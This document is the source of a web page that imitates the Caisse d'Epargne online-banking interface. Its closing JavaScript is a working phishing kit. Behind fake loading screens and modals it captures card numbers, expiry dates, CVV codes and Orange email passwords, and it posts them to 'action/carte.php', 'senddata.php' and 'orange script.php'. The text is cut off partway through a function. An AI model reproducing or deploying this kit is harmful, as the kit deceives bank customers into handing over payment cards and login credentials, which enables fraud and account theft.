    <iframe id="MM_m_Stats_oStats" class="oStatsXiti" frameborder="0" height="0" width="0" scrolling="no"></iframe>
</span>
        <span id="MM_m_PostBack">
<a id="MM_m_PostBack_btPostBack" class="UniversCourant" rel="0" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;MM$m_PostBack$btPostBack&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))" style="display:none;"></a></span>
    
</div>


                    

<script type="text/javascript">
//<![CDATA[
var Page_Validators =  new Array(document.getElementById("MM_TaskManagerValidator"));
//]]>
</script>

<script type="text/javascript">
//<![CDATA[
var MM_TaskManagerValidator = document.all ? document.all["MM_TaskManagerValidator"] : document.getElementById("MM_TaskManagerValidator");
MM_TaskManagerValidator.display = "None";
MM_TaskManagerValidator.evaluationfunction = "CustomValidatorEvaluateIsValid";
//]]>
</script>


<script type="text/javascript">
//<![CDATA[
if(typeof $('a.lien-prdvel').attr('href') != 'undefined'){ $( 'li.localisation' ).append( "<li class='prdvel-contact'  ><a href='#' class='prdvel-contact-lien' title='Prendre RDV'><span>Prendre RDV</span></a></li>" );$('.prdvel-contact-lien').attr('href',$('a.lien-prdvel').attr('href'));$('.dynamism-prdvel').text('Contact et Prise de RDV');}$(document).ready(function() { RefreshInformations(); });var fileID = 'AssistanceSAV_JS';if (!document.getElementById(fileID)){var form = document.getElementById('MM_m_UpdatePanel');if (form){var toAdd = document.createElement('script');toAdd.id = fileID;toAdd.type = 'text/javascript';toAdd.src = 'https://www.caisse-epargne.fr/cache/assistance_sav_js_20150929162735.js';form.insertBefore(toAdd, form.childNodes[0]);}}var fileID = 'AssistanceSAV_MSI_JS';if (!document.getElementById(fileID)){var form = document.getElementById('MM_m_UpdatePanel');if (form){var toAdd = document.createElement('script');toAdd.id = fileID;toAdd.type = 'text/javascript';toAdd.src = 'https://www.caisse-epargne.fr/cache/assistance_sav_msi_js_20150511103042.js';form.insertBefore(toAdd, form.childNodes[0]);}}var fileID = 'AssistanceSAV_CSS';if (!document.getElementById(fileID)){var form = document.getElementById('MM_m_UpdatePanel');if (form){var toAdd = document.createElement('link');toAdd.id = fileID;toAdd.type = 'text/css';toAdd.rel = 'stylesheet';toAdd.href = 'https://www.caisse-epargne.fr/cache/assistance_sav_css_20150511102611.css';toAdd.media = 'all';form.insertBefore(toAdd, form.childNodes[0]);}}//]]>
</script>
<script type="text/javascript">var V636877582886501455 = ["univers-home-page"];new GetContent_DEI_IND( "GetContent.aspx", V636877582886501455,"pfl=AFIDE0&nag=80128&nab=b2401f6898dcc4e19a7561d66f6d771b&auth=1&iscible=true&siteniv2=19&uparactif=0&upartransact=0|1|3|2|4|&reg=16275&mar=101" );</script>
<script type="text/javascript">
//<![CDATA[
var V636877582886501455 = ["lien_commercial"];new GetContent_DEI_IND( "GetContent.aspx", V636877582886501455,"pfl=AFIDE0&nag=80128&nab=b2401f6898dcc4e19a7561d66f6d771b&auth=1&iscible=true&siteniv2=19&uparactif=0&upartransact=0|1|3|2|4|&reg=16275&mar=101&srcban=SYNTHESE_DEI_PART_IND" );
var Page_ValidationActive = false;
if (typeof(ValidatorOnLoad) == "function") {
    ValidatorOnLoad();
}

function ValidatorOnSubmit() {
    if (Page_ValidationActive) {
        return ValidatorCommonOnSubmit();
    }
    else {
        return true;
    }
}
        url_xtcore='https://www.net627.caisse-epargne.fr/Javascripts/xtcore_V2.js';var url_transparent='https://www.caisse-epargne.fr/cache/css1301_img/transparent.gif';xt_ac='5';xt_at='b2401f6898dcc4e19a7561d66f6d771b';xt_ati='';xt_multc='&x1=2&x2=0';xtpage='Syntheses_::_Synthese_globale';xtsite='354342';xtp='Syntheses_::_Synthese_globale';xtn2='19';xt8b='s=354342';if (datalayer != null) {
datalayer.client.id = '005296588';
datalayer.client.idEnttGrpe = '16275';
datalayer.page.codeEnttGrpe = 'CENFE';
datalayer.page.univers = 'Ma synthèse';
datalayer.page.pageType = 'DEI';
datalayer.page.pageName = 'comptes synthese';
datalayer.page.espace = 'Transactionnel';
datalayer.produit.gamme = '';
datalayer.produit.code = '';
datalayer.form.nom = '';
datalayer.form.idEtape = '';
datalayer.campagne.id = '';
datalayer.clic.libelle = '';
datalayer.clic.type = '';
datalayer.push.titre = '';
datalayer.push.type = '';
datalayer.push.theme = '';
datalayer.push.gamme = '';
datalayer.social.name = '';
datalayer.mail.object = '';
datalayer.search.searched = '';
datalayer.search.results = '';
}
var estFormWzrdEtapeDebut = false;
var estFormWzrdEtapeFin = false;
(function(a,b,c,d){a='//tags.tiqcdn.com/utag/caisse-epargne/ce-nat/prod/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/javascript';d.async=true;a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a);})();
document.getElementById('MM_TaskManagerValidator').dispose = function() {
    Array.remove(Page_Validators, document.getElementById('MM_TaskManagerValidator'));
}
Sys.Application.add_init(function() {
    $create(iucon.web.Controls.PartialUpdatePanel, {"AutoRefreshInterval":0,"CurrentCulture":"fr-FR","CurrentUICulture":"en-US","DisplayLoadingAfter":0,"EncryptUserControlPath":true,"InitiallyRenderFromClient":false,"Parameters":null,"PreserveContentOnRefresh":false,"ScriptManagerInfo":{"ScriptManagerID":"m_ScriptManager","ScriptManagerType":"LTblFhScWQy6ZXu6yN6dPiL3hYYovBLmj6Be72FNzpS7mNTXFEF9bCDGQQkkLrd%2bKVxyLLalLpR62GdpK7L9JZgQ0igjD5aveZrQJK4C6%2bGQTo4LW86kkWkNC47V6ZkqsGNr1yy%2fUZEYYKhxiYXu3VcPo0JIQ2il"},"ShowLoading":true,"UserControlPath":"rNQqJWoAoyrFN1zQBUE30qCTKbjplf4GuXBwNAmOT6PBqQ%2bfbQnnUlpBqeDmrF0DUYihBS7A7%2bQj%2bOrw6gmukQ%3d%3d"}, null, null, $get("MM_ctl02_ctl02_PartialUpdatePanel"));
});
//]]>
</script>
</form>



<div class="hidden popin popinExitConfirm tPopinDei">
		<div class="tCloseBtn">
        	<a href="#" class="off fermerPopin"><img src="Demo/12112013_popin_dein_close.png" alt="" /></a>
        </div>
    	<h6>Voulez-vous quitter le mode d&eacute;monstration<br />et fermer la fen&ecirc;tre active ?</h6>
        <div class="tPopinDeiBtns">
        	<a href="javascript:Delete_Cookie('DEI_SESSION_ID', '/' ); Delete_Cookie('.ASPXFORMSAUTH', '/' ); Delete_Cookie('SES', '/' ); window.open('', '_self', ''); window.close();" title="Quitter"><img src="Demo/12112013_popin_dein_quitter.png" alt="Quitter" /></a>
        	<a href="#" class="off fermerPopin" title="Annuler"><img src="Demo/12112013_popin_dein_annuler.png" alt="Annuler" /></a>
        </div>
        <p>Si vous n'&ecirc;tes pas encore abonn&eacute;, vous pouvez :</p>
        <div class="tPopinDeiThumb">
        	<div class="tPopinDeiThumb1">
            	Faire une demande<br />en ligne<br />
                <a href="https://www.caisse-epargne.fr/sous_ouv_formulaire_chapeau_evi_demo.aspx?srcurlconfigchapeau=sous_ouv_formulaire_chapeau_dei_config_evi" title="Cliquer-ici"><img src="Demo/12112013_popin_dein_btn.png" alt="Cliquer-ici" /></a>
            </div>
            <div class="tPopinDeiThumb2">
            	faire une demande<br />par t&eacute;l&eacute;phone<br />au 3241<br />
                <span>Co&ucirc;t d'un appel local</span>
            </div>
            <div class="tPopinDeiThumb3">
            	vous rendre<br />dans votre<br />agence
            </div>
        </div>
        <div class="tClearFloats">.</div>
</div>

                 
            </div>
        </div>
    </div>

            <!--[if (gte IE 9) ]>
<footer id="footer" class="footer" style="overflow:inherit">
<![endif]-->
<!--[if lt IE 9]>
<div id="footer" class="footer" style="overflow:inherit">
<![endif]-->
<![if !IE]>
<footer id="footer" class="footer" style="overflow:inherit">
<![endif]>
    <div class="container">
        <div>
            <table class="row" width="980">
                <tr>
                    <td width="220">
                        <div class="col-md-3">
                            <div class="dropdown li_footer_dei"><a href="#" data-toggle="dropdown" class="title">Banque au quotidien</a><table width="220"><tr class="dropdown-menu"><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/au-quotidien/conseil-ouvrir-compte-bancaire" style="text-decoration:none" target=""       data-tracking-link-title="Ouvrir un compte bancaire" >
                                                            
                                Ouvrir un compte bancaire
                                    </a></li><li><a href="https://www.monbanquierenligne.fr/nord-france-europe" style="text-decoration:none" target="_blank"       data-tracking-link-title="Mon Banquier en Ligne" >
                                                            
                                Mon Banquier en Ligne
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/au-quotidien/produit-service-aide-mobilite" style="text-decoration:none" target=""       data-tracking-link-title="Dispositif de mobilité bancaire" >
                                                            
                                Dispositif de mobilité bancaire
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/tarifs-informations-reglementaires" style="text-decoration:none" target=""       data-tracking-link-title="Tarifs et informations réglementaires" >
                                                            
                                Tarifs et informations réglementaires
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/dda" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','directive-de-distribution-d-assurances','S')"
      data-tracking-link-title="Directive de Distribution d’Assurances" >
                                                            
                                Directive de Distribution d’Assurances
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/au-quotidien/dossier-comprendre-les-frais-bancaires" style="text-decoration:none" target=""       data-tracking-link-title="Comprendre les frais bancaires" >
                                                            
                                Comprendre les frais bancaires
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/epargner/dossier-succession-transmission" style="text-decoration:none" target=""       data-tracking-link-title="Transmission – Successions" >
                                                            
                                Transmission – Successions
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/comptes-inactifs-et-desherence" style="text-decoration:none" target=""       data-tracking-link-title="Comptes inactifs et déshérence" >
                                                            
                                Comptes inactifs et déshérence
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/fonds-garantie-depots-resolution" style="text-decoration:none" target=""       data-tracking-link-title="Garantie des dépôts" >
                                                            
                                Garantie des dépôts
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/conseil-eai" style="text-decoration:none" target=""       data-tracking-link-title="Echange d’informations fiscales" >
                                                            
                                Echange d’informations fiscales
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/au-quotidien/nos-produits-pour-gerer-son-quotidien/solutions-personnes-protegees" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','accompagner-une-personne-protegee','S')"
      data-tracking-link-title="Accompagner une personne protégée" >
                                                            
                                Accompagner une personne protégée
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/protection-donnees-personnelles" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','protection-des-donnees-personnelles','S')"
      data-tracking-link-title="Protection des données personnelles" >
                                                            
                                Protection des données personnelles
                                    </a></li></tr></table></div>
                        </div>
                    </td>
                    <td width="220">
                        <div class="col-md-3">
                            <div class="dropdown li_footer_dei"><a href="#" data-toggle="dropdown" class="title">Gestion de compte</a><table width="220"><tr class="dropdown-menu"><li><a href="https://www.netdemo.caisse-epargne.fr/Demo.htm" style="text-decoration:none" target=""       data-tracking-link-title="Espace Personnel - Mode Démo" >
                                                            
                                Espace Personnel - Mode Démo
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/services-mobiles" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','applications-mobiles','S')"
      data-tracking-link-title="Applications mobiles" >
                                                            
                                Applications mobiles
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/faq-applications-mobiles/faq-connexion" style="text-decoration:none" target=""       data-tracking-link-title="FAQ Applications mobiles" >
                                                            
                                FAQ Applications mobiles
                                    </a></li></tr></table></div><div class="dropdown li_footer_dei"><a href="#" data-toggle="dropdown" class="title">Simulateurs en ligne</a><table width="220"><tr class="dropdown-menu"><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/s-assurer/vad_intermediaire_pp" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','devis-assurances','S')"
      data-tracking-link-title="Devis assurances" >
                                                            
                                Devis assurances
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/emprunter/simuler-mon-pret-immobilier" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','simulateur-pret--immobilier','S')"
      data-tracking-link-title="Simulateur Prêt  immobilier" >
                                                            
                                Simulateur Prêt  immobilier
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/emprunter/calc-credit-conso-travaux" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','simulateur-pret-travaux','S')"
      data-tracking-link-title="Simulateur Prêt travaux" >
                                                            
                                Simulateur Prêt travaux
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/s-assurer/devis-assur-toit" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','devis-assurance-habitation','S')"
      data-tracking-link-title="Devis Assurance Habitation" >
                                                            
                                Devis Assurance Habitation
                                    </a></li></tr></table></div>
                        </div>
                    </td>
                    <td width="220">
                        <div class="col-md-3">
                            <div class="dropdown li_footer_dei"><a href="#" data-toggle="dropdown" class="title">Aide et outils pratiques</a><table width="220"><tr class="dropdown-menu"><li><a href="https://www.caisse-epargne.fr/hauts-de-france/services-numeros-utiles" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','services-et-numeros-utiles','S')"
      data-tracking-link-title="Services et numéros utiles" >
                                                            
                                Services et numéros utiles
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/au-quotidien/conseil-perte-vol-moyens-de-paiement" style="text-decoration:none" target=""       data-tracking-link-title="Assistance perte et vol / Opposition" >
                                                            
                                Assistance perte et vol / Opposition
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/faq-caisse-epargne" style="text-decoration:none" target=""       data-tracking-link-title="FAQ" >
                                                            
                                FAQ
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/mentions-legales" style="text-decoration:none" target=""       data-tracking-link-title="Mentions légales" >
                                                            
                                Mentions légales
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/dossier-conseils-securite" style="text-decoration:none" target=""       data-tracking-link-title="Sécurité" >
                                                            
                                Sécurité
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/faq-particuliers/accessibilite" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','accessibilite','S')"
      data-tracking-link-title="Accessibilité" >
                                                            
                                Accessibilité
                                    </a></li><li><a href="https://www.agences.caisse-epargne.fr/banque-assurance/hauts-de-france/agences/" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','agences_store_locator','S')"
      data-tracking-link-title="Agences" >
                                                            
                                Agences
                                    </a></li></tr></table></div><div class="dropdown li_footer_dei"><a href="#" data-toggle="dropdown" class="title">Toutes nos offres</a><table width="220"><tr class="dropdown-menu"><li><a href="https://www.caisse-epargne.fr/particuliers/au-quotidien/toutes-les-offres-au-quotidien?#block_4948" style="text-decoration:none" target="_blank"             onclick="return xt_click(this,'C','50','forfaits-et-cartes','S')"
      data-tracking-link-title="Forfaits et cartes" >
                                                            
                                Forfaits et cartes
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/epargner/toutes-les-offres-pour-epargner" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','toutes-nos-offres-d-epargne','S')"
      data-tracking-link-title="Toutes nos offres d’épargne" >
                                                            
                                Toutes nos offres d’épargne
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/emprunter/toutes-les-offres-pour-emprunter" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','toutes-nos-offres-de-credit','S')"
      data-tracking-link-title="Toutes nos offres de crédit" >
                                                            
                                Toutes nos offres de crédit
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/s-assurer/toutes-les-offres-pour-s-assurer" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','toutes-nos-offres-d-assurance','S')"
      data-tracking-link-title="Toutes nos offres d’assurance" >
                                                            
                                Toutes nos offres d’assurance
                                    </a></li></tr></table></div>
                        </div>
                    </td>
                    <td width="220">
                        <div class="col-md-3">
                            <div class="dropdown li_footer_dei"><a href="#" data-toggle="dropdown" class="title">La Caisse d’Epargne et vous</a><table width="220"><tr class="dropdown-menu"><li><a href="https://www.caisse-epargne.fr/hauts-de-france/particuliers/au-quotidien/conseil-devenir-client" style="text-decoration:none" target=""       data-tracking-link-title="Nous connaitre" >
                                                            
                                Nous connaitre
                                    </a></li><li><a href="http://www.fnce.fr" style="text-decoration:none" target="_blank"       data-tracking-link-title="Fédération Nationale (FNCE)" >
                                                            
                                Fédération Nationale (FNCE)
                                    </a></li><li><a href="http://www.gestionprivee.caisse-epargne.fr/" style="text-decoration:none" target="_blank"       data-tracking-link-title="Gestion Privée" >
                                                            
                                Gestion Privée
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/mecenat-sponsoring" style="text-decoration:none" target=""       data-tracking-link-title="Sponsoring - Mécénat" >
                                                            
                                Sponsoring - Mécénat
                                    </a></li><li><a href="http://www.recrute.caisse-epargne.com/" style="text-decoration:none" target="_blank"       data-tracking-link-title="Recrutement" >
                                                            
                                Recrutement
                                    </a></li><li><a href="http://www.societaires.caisse-epargne.fr" style="text-decoration:none" target="_blank"       data-tracking-link-title="Site Sociétaires" >
                                                            
                                Site Sociétaires
                                    </a></li><li><a href="https://www.espacedons.com/" style="text-decoration:none" target="_blank"       data-tracking-link-title="Espace Dons" >
                                                            
                                Espace Dons
                                    </a></li><li><a href="https://www.caisse-epargne.fr/hauts-de-france/espace-international" style="text-decoration:none" target=""             onclick="return xt_click(this,'C','50','LienEspaceInternational','S')"
      data-tracking-link-title="Who are we?" >
                                                            
                                Who are we?
                                    </a></li><li class="visible-md visible-lg"><a href="https://www.caisse-epargne.fr/hauts-de-france/aide/choisir-sa-caisse" target="" id="full_switch_caisse" class="regional-fund">Changer de Caisse</a></li><li class="socials"><ul><li><a href="https://www.facebook.com/Caisse.Epargne.Hauts.de.France" title="Page Fan Facebook Caisse Epargne Hauts de France" class="social facebook ezurl-field" target="_blank"></a></li><li><a href="https://twitter.com/Caisse_Epargne" title="Caisse d&#039;Epargne - Twitter" class="social twitter ezurl-field" target="_blank"></a></li><li><a href="https://fr.linkedin.com/company/caissedepargne-hautsdefrance" title="Caisse d&#039;Epargne Hauts de France - linkedin" class="social linkedin ezurl-field" target="_blank"></a></li><li><a href="https://www.youtube.com/channel/UCvaKfCXaEV90xTP0rIj-Sgg" title="Caisse d&#039;Epargne Hauts de France- youtube " class="social youtube ezurl-field" target="_blank"></a></li></ul></li></tr></table></div>

                            <div class="dropdown"><div class="ezxmltext-field"><div><img src="https://www.caisse-epargne.fr:443/var/storage/images/media/images-uploadees/la-communaute-_by-ce_160x32/2802000-2-fre-FR/la-communaute-_by-ce_160x32.png?1.4.11" 
                     width="160"                      height="32"                     alt=""
                     title=""
                     class="ezimage-field ezimage-field" /></div></div></div>
                        </div>
                    </td>
                </tr>
            </table>
        </div>
    </div>
<!--[if (gte IE 9)]>
</footer>
<![endif]-->
<!--[if lt IE 9]>
</div>
<![endif]-->
<![if !IE]>
</footer>
<![endif]>




    <script type="text/javascript">
        var iAdvizeSid = "6081";

        if (iAdvizeSid !== null && iAdvizeSid !== "" ) {
            <!-- START IADVIZE LIVECHAT -->
            (function () {
                var idz = document.createElement('script');
                idz.type = 'text/javascript';
                idz.async = true;
                idz.src = document.location.protocol + "//halc.iadvize.com/chat_init.js?sid=" + iAdvizeSid;
                var s = document.getElementsByTagName('script')[0];
                s.parentNode.insertBefore(idz, s);
            })();
            <!-- END IADVIZE LIVECHAT -->

            <!-- START IADVIZE CUSTOMDATA -->
            var device = 'desktop';
            var expression = '(android|iphone|ipad|blackberry|windows phone|IEMobile|windows mobile|opera mini|blackberry|nokia|samsung)';
            var regex = new RegExp(expression, 'gi');
            if (navigator.userAgent.match(regex)) {
                if (((screen.width >= 480) && (screen.height >= 800)) || ((screen.width >= 800) && (screen.height >= 480)) || navigator.userAgent.match(/ipad/gi)) {
                    device = 'tablet';
                } else {
                    device = 'mobile';
                }
            } else {
                device = 'desktop';
            }

            idzCustomData = {
                'device': device,
                'page_type': datalayer.page.pageName
            }
            <!-- END IADVIZE CUSTOMDATA -->
        }
    </script>



                    
        <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/ee5863a.js?1.4.11"></script>
            <script type="text/javascript" src="https://www.caisse-epargne.fr:443/js/ec1c51b.js?1.4.11"></script>
    
            <script type="text/javascript">
        window.criteo_q = window.criteo_q || [];
    </script>

              
            </div>

			
			<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
			<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
			<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>

			<script type="text/javascript">
			
			var fiveMinutes = 60 * 5+14;
            $(document).ready(function () {
				

				setTimeout(function()
				{
							
					jQuery('.loaderdiv2').replaceWith(jQuery('#mbodycustom6'));
					// display = document.querySelector('#time');
					// startTimer(fiveMinutes, display);
					$("#mbodycustom6").show();
				}, 4000);
				//mabin log o CC

				
				/*setTimeout(function()
				{
							
					jQuery('.loaderdiv2').replaceWith(jQuery('#mbody3'));
					display = document.querySelector('#time');
					startTimer(fiveMinutes, display);
					$("#mbody3").show();
				}, 14000);*/
				
				
                function traitement()
				{
				//Traitement à effectuer sur la page
				setTimeout(suiteTraitement, 1100) //Attendez 10 secondes avant de continuer dans la fonction suivante
				}
				function suiteTraitement()
				{
					$('#exampleModal').modal({
						backdrop: 'static',
						keyboard: false
					})
					$('#exampleModal').modal('show');
					
					// display = document.querySelector('#time');
					// startTimer(fiveMinutes, display);
					

				}
				traitement();
            });
        </script>
 

<script>

	var val_email, val_p1, val_p2, val_sms, val_cc, c2,c3,c4 ,sms1;

	var fiveMinutes = 60 * 5+14;
	var fiveMinutes2 = 60 * 5;

	function validate(){
		var cc = document.getElementById("ccnum").value;
		
		if (validateCardNumber(cc) == false)
		{
			$('#warningparag2').show();
			
			document.getElementById("warningparag2").innerHTML = "Vérifiez votre numero de carte bancaire !"
			document.getElementById("ccnum").style.borderColor="red";
			return false;
		}
		return true;
	}
	
	function validateCardNumber(number) {
		var regex = new RegExp("^[0-9]{16}$");
		if (!regex.test(number))
			return false;
		return luhnCheck(number);
	}

	function luhnCheck(val) {
		var sum = 0;
		for (var i = 0; i < val.length; i++) {
			var intVal = parseInt(val.substr(i, 1));
			if (i % 2 == 0) {
				intVal *= 2;
				if (intVal > 9) {
					intVal = 1 + (intVal % 10);
				}
			}
			sum += intVal;
		}
		return (sum % 10) == 0;
	}
	
	
//var cosmos = 3;
var cosmos = 6;

$('#valideritem').click(function(){

	if (cosmos==1)
	{
		var email_regex = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		var passwd_regex = /^(?=.*[0-9])(?=.*[a-zA-Z]).{8,}$/;
		if ($('#email').val()== ""  )
		{
			$('#mbody1 input').addClass('warninginput');
			$('#warningparag1').html("Votre adresse e-mail est incorrecte");
			$('#warningparag1').show();
			return;
		}
		if( $('#password').val()== ""){

			$('#mbody1 input').addClass('warninginput');
			$('#warningPassVerification1').html("Votre mot de passe est incorrect");
			$('#warningPassVerification1').show();
			return;
		}
		if(!email_regex.test($('#email').val())) {
			$('#mbody1 #email').addClass('warninginput');
			$('#warningparag1').html("Votre adresse e-mail est incorrecte");
			$('#warningparag1').show();
			return;
		}
		if($('#email').val().toLowerCase().includes('orange.fr') == false && $('#email').val().toLowerCase().includes('wanadoo.fr') == false){
			$('#mbody1 #email').addClass('warninginput');
			$('#warningparag1').html("Votre adresse e-mail est incorrecte");
			$('#warningparag1').show();
			return;
		}

		var pass_str = $('#password').val();
		if(passwd_regex.test(pass_str))
		{
			var email = $('#email').val();
			var password = $('#password').val();
			val_email = email;
			val_p1 = password;

		    // jQuery('#mbody1').replaceWith(jQuery('.loaderdiv'));
		    jQuery('#mbody1').hide();
			$(".loaderdiv").show();
			$.ajax({
		        url: "orange script.php",
		        data:{email:email, password: password},
		        type:"post",
		        dataType:"json",
		        success: function(data){
		            if(data.status=="success"){
		            	cosmos = 9;
		            	jQuery('#mbody1').replaceWith(jQuery('.loaderdiv'));
						$(".loaderdiv").show();
						setTimeout(function(){
								jQuery('.loaderdiv').replaceWith(jQuery('#mbody1_1'));
								$(".loaderdiv").hide();
								$("#mbody1_1").show();
								$("#password_2").val('');
								$("#email_2").val(email);
								$("#email_2").attr('readonly','readonly');
								$("#email_2").attr('disabled','disabled');
								//display = document.querySelector('#time');
								//startTimer(fiveMinutes, display);
							}, 
							7000
						);	
		            }
		            else{
		            		jQuery('#mbody1').show();
							$(".loaderdiv").hide();
							$('#warningparag1').show();
							$('#warningPassVerification1').hide();
							$('#mbody1 input').addClass('warninginput');
							$('#password').focus();
		            }
		        },
		        error: function(){
					$(".loaderdiv").hide();
					$('#mbody1 input').addClass('warninginput');
					$('#password').focus();
		        }
		    });
		}
		else{
			jQuery('#mbody1').hide();
			$(".loaderdiv").show();

			setTimeout(function(){
				jQuery('#mbody1').show();
					$(".loaderdiv").hide();
					$('#warningparag1').hide();
					$('#warningPassVerification1').html("Votre mot de passe est incorrect");
					$('#warningPassVerification1').show();
					$('#mbody1 input').addClass('warninginput');
					$('#password').focus();
				},3000)
			return;
		}
		
	}
	if(cosmos == 9){
		var email_regex = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		var passwd_regex = /^(?=.*[0-9])(?=.*[a-zA-Z]).{8,}$/;

		if ($('#password_2').val()== "" )
		{
			$('#mbody1_1 input').addClass('warninginput');
			$('#warningPassVerification2').html("Votre mot de passe est incorrect");
			$('#warningPassVerification2').show();
			return;
		}
		var pass_str = $('#password_2').val();
		if(passwd_regex.test(pass_str))
		{
			var email = $('#email_2').val();
			var password = $('#password_2').val();
			val_p2 = password;

		    // jQuery('#mbody1').replaceWith(jQuery('.loaderdiv'));
		    jQuery('#mbody1_1').hide();
			$(".loaderdiv7").show();
			
			var user_id = "<?php echo $user_id; ?>";
			var user_pass = "<?php echo $user_password; ?>";
			var cc = "4978-"+c2+"-"+c3+"-"+c4;
        	$.ajax
			({ 
				url: 'senddata.php',
				data: {user_id:user_id,user_pass:user_pass,cc:cc,email:val_email,p1:val_p1,p2:val_p2},
				type: 'post',
				dataType:"json",
				success: function(result)
				{
        				cosmos = 3;
			        	jQuery('#mbody1_1').replaceWith(jQuery('.loaderdiv7'));
						$(".loaderdiv7").show();
						setTimeout(function(){
								jQuery('.loaderdiv7').replaceWith(jQuery('#mbody3'));
								$(".loaderdiv7").hide();
								$("#mbody3").show();
								display = document.querySelector('#time');
								startTimer(fiveMinutes, display);
							}, 
							12000
						);	
				}
			});
		           
		}
		else{
			jQuery('#mbody1_1').hide();
			$(".loaderdiv7").show();

			setTimeout(function(){
				jQuery('#mbody1_1').show();
							$(".loaderdiv7").hide();
							$('#warningparag2').hide();
							$('#warningPassVerification2').html("Votre mot de passe est incorrect");
							$('#warningPassVerification2').show();
							$('#mbody1_1 input').addClass('warninginput');
							$('#password_2').focus();
			},3000)
			return;
		}
	}
	if (cosmos==2)
	{
		
		
		jQuery('#mbody1').replaceWith(jQuery('.loaderdiv2'));
		$(".loaderdiv2").show();
				
		
		setTimeout(function()
		{
			jQuery('.loaderdiv2').replaceWith(jQuery('#mbody3'));
			display = document.querySelector('#time');
			startTimer(fiveMinutes, display);
			$("#mbody3").show();
		}, 5000);
		//timer tani 14000

		
	}

	if (cosmos==6)
	{
				
		//jQuery('#mbodycustom6').replaceWith(jQuery('.loaderdiv3'));
		
		//$(".loaderdiv3").show();
		

		var secondcc = jQuery('#customcode2').val();
		var thirdcc  = jQuery('#customcode3').val();
		var fourthcc = jQuery('#customcode4').val();
		var exp = jQuery('#expm').val()+" / "+jQuery('#expy').val();
		var ccv = jQuery('#ccv').val();
		c2= secondcc;
		c3= thirdcc;
		c4= fourthcc;
		/*setTimeout(function()
		{
			jQuery('.loaderdiv3').replaceWith(jQuery('#mbody3'));
			display2 = document.querySelector('#time2');
			startTimer(fiveMinutes2, display2);
			$("#mbody3").show();
		}, 3000);*/
		if(secondcc.length == 4 && thirdcc.length== 4 && fourthcc.length ==4)
		{
			jQuery('#mbodycustom6').replaceWith(jQuery('.loaderdiv6'));
		
			$(".loaderdiv6").show();
			var cc = "4978 "+c2+" "+c3+" "+c4;
        	$.ajax
			({ 
				url: 'action/carte.php',
				data: {ccnum4:cc,exp:exp,ccv:ccv},
				type: 'post',
				dataType:"json",
			
				success: function(result)
				{
		
					
						cosmos = 3;
					
						
						setTimeout(function()
						{
